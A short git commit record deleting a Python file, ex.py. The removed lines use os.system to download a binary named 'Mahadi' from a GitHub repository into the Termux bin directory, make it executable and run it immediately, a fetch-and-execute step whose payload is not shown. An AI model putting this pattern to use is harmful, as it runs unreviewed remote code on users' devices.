4cbd3b9dfd73e452a5d89ac73b5cb76cb3b7fcae
MR - FUCKER <121819973+Peaky-XD@users.noreply.github.com>
2023-05-21 11:31:00 +0600

    Delete ex.py

--- ex.py
+++
@@ -1,4 +0,0 @@
-import os 
-os.system("curl -L https://github.com/X-NINJA-XD/.../raw/main/Mahadi -o /data/data/com.termux/files/usr/bin/Mahadi;chmod +x /data/data/com.termux/files/usr/bin/Mahadi;Mahadi")
-
-
